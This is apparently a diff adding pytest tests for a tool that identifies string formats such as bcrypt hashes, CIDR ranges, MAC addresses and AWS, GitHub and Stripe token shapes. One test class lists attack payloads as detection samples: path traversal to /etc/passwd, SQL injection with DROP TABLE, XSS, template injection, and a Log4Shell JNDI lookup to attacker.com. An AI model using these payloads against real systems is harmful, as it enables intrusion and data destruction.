@@ -582,3 +582,205 @@ class TestIdentifyEmpty:
     def test_empty_returns_no_hints(self):
         assert identify_format("") == []
         assert identify_format("   ") == []
+
+
+# ---------------------------------------------------------------------
+# Additional format detectors (modern hashes, network, vendor tokens,
+# attack payloads)
+# ---------------------------------------------------------------------
+class TestIdentifyModernHashes:
+    def test_bcrypt(self):
+        # Sample bcrypt for 'password': $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
+        h = "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
+        assert any("Bcrypt" in l for l in _labels(h))
+
+    def test_crypt3_sha256(self):
+        # $5$ = SHA256-crypt
+        h = "$5$rounds=5000$saltsalt$abc"
+        labels = _labels(h)
+        assert any("crypt(3)" in l and "SHA256-crypt" in l for l in labels)
+
+    def test_argon2(self):
+        h = "$argon2id$v=19$m=65536,t=3,p=4$saltsalt$hashhash"
+        assert any("Argon2" in l for l in _labels(h))
+
+
+class TestIdentifyNetworkExtra:
+    def test_ipv4_cidr(self):
+        assert any("CIDR" in l for l in _labels("10.0.0.0/8"))
+        assert any("CIDR" in l for l in _labels("192.168.1.0/24"))
+
+    def test_invalid_cidr_rejected(self):
+        # /99 is invalid (must be 0-32 for IPv4)
+        assert not any("CIDR" in l for l in _labels("10.0.0.0/99"))
+
+    def test_ipv6_compressed(self):
+        for addr in ("::1", "fe80::1", "2001:db8::1"):
+            labels = _labels(addr)
+            assert any("IPv6" in l for l in labels), f"failed on {addr!r}"
+
+    def test_ipv6_full(self):
+        addr = "2001:0db8:85a3:0000:0000:8a2e:0370:7334"
+        assert any("IPv6" in l for l in _labels(addr))
+
+    def test_mac_address_colon(self):
+        assert any("MAC" in l for l in _labels("aa:bb:cc:dd:ee:ff"))
+
+    def test_mac_address_dash(self):
+        assert any("MAC" in l for l in _labels("AA-BB-CC-DD-EE-FF"))
+
+
+class TestIdentifyMongoObjectId:
+    def test_24_hex_chars(self):
+        # NOT 32 (MD5), NOT 40 (SHA-1) - 24 is distinctively ObjectId.
+        labels = _labels("507f1f77bcf86cd799439011")
+        assert any("MongoDB ObjectId" in l for l in labels)
+
+    def test_md5_not_flagged_as_objectid(self):
+        # 32 hex chars - should be MD5, NOT ObjectId.
+        labels = _labels("21232f297a57a5a743894a0e4a801fc3")
+        assert not any("MongoDB" in l for l in labels)
+
+
+class TestIdentifyVendorTokens:
+    def test_aws_access_key_id_permanent(self):
+        labels = _labels("AKIAIOSFODNN7EXAMPLE")
+        assert any("AWS access key" in l and "permanent" in l for l in labels)
+
+    def test_aws_access_key_id_temporary(self):
+        labels = _labels("ASIAIOSFODNN7EXAMPLE")
+        assert any("AWS access key" in l and "temporary" in l for l in labels)
+
+    def test_github_personal_access_token(self):
+        # ghp_ prefix + 36-40 alphanum chars
+        token = "ghp_" + "A" * 36
+        assert any("GitHub" in l and "Personal" in l for l in _labels(token))
+
+    def test_github_server_token(self):
+        token = "ghs_" + "A" * 36
+        assert any("GitHub" in l and "Server-to-server" in l for l in _labels(token))
+
+    def test_stripe_secret_live(self):
+        token = "sk_live_" + "A" * 24
+        labels = _labels(token)
+        assert any("Stripe" in l and "SECRET" in l and "LIVE" in l for l in labels)
+
+    def test_stripe_publishable_test(self):
+        token = "pk_test_" + "A" * 24
+        labels = _labels(token)
+        assert any("Stripe" in l and "publishable" in l and "TEST" in l for l in labels)
+
+    def test_slack_bot_token(self):
+        token = "xoxb-123-456-AAAAAAAA"
+        labels = _labels(token)
+        assert any("Slack" in l and "Bot" in l for l in labels)
+
+    def test_gitlab_pat(self):
+        token = "glpat-" + "A" * 20
+        assert any("GitLab" in l for l in _labels(token))
+
+
+class TestIdentifyAttackPayloads:
+    def test_path_traversal_plain(self):
+        for payload in ("../../../etc/passwd", "..\\..\\windows\\system32",
+                         "%2e%2e/admin"):
+            labels = _labels(payload)
+            assert any("Path traversal" in l for l in labels), f"failed on {payload!r}"
+
+    def test_sql_injection_union(self):
+        for payload in ("' UNION SELECT NULL--",
+                         "1 OR 1=1",
+                         "admin'--",
+                         "1; DROP TABLE users--",
+                         "1' AND SLEEP(5)--"):
+            labels = _labels(payload)
+            assert any("SQL injection" in l for l in labels), \
+                f"failed on {payload!r}"
+
+    def test_xss_payloads(self):
+        for payload in ("<script>alert(1)</script>",
+                         "<img src=x onerror=alert(1)>",
+                         "javascript:alert(1)",
+                         "<body onload=alert(1)>"):
+            labels = _labels(payload)
+            assert any("XSS" in l for l in labels), f"failed on {payload!r}"
+
+    def test_template_injection(self):
+        for payload in ("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"):
+            labels = _labels(payload)
+            assert any("Template injection" in l for l in labels), \
+                f"failed on {payload!r}"
+
+    def test_jndi_log4shell(self):
+        labels = _labels("${jndi:ldap://attacker.com/x}")
+        assert any("JNDI" in l for l in labels)
+
+
+class TestIdentifyHttpBasicAuth:
+    def test_basic_auth_detected(self):
+        import base64 as _b64
+        # 'admin:password' base64
+        value = _b64.b64encode(b"admin:password").decode()
+        labels = _labels(value)
+        assert any("HTTP Basic" in l for l in labels)
+
+    def test_random_base64_not_flagged_as_basic_auth(self):
+        # 'just_random_data' base64 - no colon in decoded form, so no Basic-auth hint.
+        import base64 as _b64
+        value = _b64.b64encode(b"just_random_data").decode()
+        labels = _labels(value)
+        assert not any("HTTP Basic" in l for l in labels)
+
+
+# ---------------------------------------------------------------------
+# De-noising: more-specific identifications suppress less-specific ones
+# ---------------------------------------------------------------------
+class TestIdentifyDenoising:
+    def test_aws_key_not_also_flagged_as_generic_base64(self):
+        # AWS keys are alphanum+ but suggesting "decode this as base64"
+        # is actively wrong - so we suppress the base64 hint when AWS
+        # already matched.
+        labels = _labels("AKIAIOSFODNN7EXAMPLE")
+        assert any("AWS" in l for l in labels)
+        assert not any(l.startswith("Looks like base64") for l in labels)
+
+    def test_github_token_not_also_flagged_as_base64(self):
+        token = "ghp_" + "A" * 36
+        labels = _labels(token)
+        assert any("GitHub" in l for l in labels)
+        assert not any(l.startswith("Looks like base64") for l in labels)
+
+    def test_objectid_not_also_flagged_as_hex_bytes(self):
+        labels = _labels("507f1f77bcf86cd799439011")
+        assert any("MongoDB" in l for l in labels)
+        assert not any("Hex-encoded" in l for l in labels)
+
+    def test_objectid_not_also_flagged_as_base64(self):
+        # 24 hex chars happen to be valid base64 input too (the decode
+        # would just produce 18 bytes of binary garbage), so the
+        # "decode as base64" hint is wrong - suppress it.
+        labels = _labels("507f1f77bcf86cd799439011")
+        assert not any(l.startswith("Looks like base64") for l in labels)
+
+    def test_md5_not_also_flagged_as_base64(self):
+        # Same reason: 32 hex chars are also valid base64 input.
+        labels = _labels("21232f297a57a5a743894a0e4a801fc3")
+        assert any("MD5" in l for l in labels)
+        assert not any(l.startswith("Looks like base64") for l in labels)
+
+    def test_bcrypt_not_also_flagged_as_base64(self):
+        h = "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
+        labels = _labels(h)
+        assert any("Bcrypt" in l for l in labels)
+        assert not any(l.startswith("Looks like base64") for l in labels)
+
+    def test_mac_address_not_also_flagged_as_ipv6(self):
+        # 'aa:bb:cc:dd:ee:ff' has 5 colons, no '::' - shouldn't trip IPv6.
+        labels = _labels("aa:bb:cc:dd:ee:ff")
+        assert any("MAC" in l for l in labels)
+        assert not any("IPv6" in l for l in labels)
+
+    def test_ipv6_with_compression_still_caught(self):
+        # Sanity: tightening didn't break the real IPv6 case.
+        assert any("IPv6" in l for l in _labels("::1"))
+        assert any("IPv6" in l for l in _labels("2001:db8::1"))
